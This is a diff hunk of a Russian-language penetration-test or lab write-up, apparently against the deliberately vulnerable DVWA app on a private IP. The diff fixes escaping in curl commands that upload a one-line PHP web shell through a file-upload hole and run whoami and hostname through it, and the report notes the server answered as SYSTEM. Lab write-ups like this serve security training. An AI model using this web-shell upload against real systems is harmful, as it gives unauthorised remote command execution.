@@ -10,11 +10,11 @@
 ```bash
 # 1. Загрузка веб-шелла
 IP="192.168.1.138"
-curl -s -X POST -H "Cookie: PHPSESSID=b6la41lodg3lsrp9voeobq2tvg; security=low" -F "uploaded=@-;filename=shell.php" -F "Upload=Upload" "http://\${IP}/vulnerabilities/upload/" <<< '<?php system(\$_GET["cmd"]); ?>'
+curl -s -X POST -H "Cookie: PHPSESSID=b6la41lodg3lsrp9voeobq2tvg; security=low" -F "uploaded=@-;filename=shell.php" -F "Upload=Upload" "http://${IP}/vulnerabilities/upload/" <<< '<?php system($_GET["cmd"]); ?>'
 
 # 2. Активация веб-шелла и выполнение команд разведки
-curl -s "http://\${IP}/hackable/uploads/shell.php?cmd=whoami"
-curl -s "http://\${IP}/hackable/uploads/shell.php?cmd=hostname"
+curl -s "http://${IP}/hackable/uploads/shell.php?cmd=whoami"
+curl -s "http://${IP}/hackable/uploads/shell.php?cmd=hostname"
 ```
 
 **Результат:** Сервер ответил `nt authority\система` и хостом `WIN-EGFO6580PJF` (Apache запущен от `SYSTEM`).
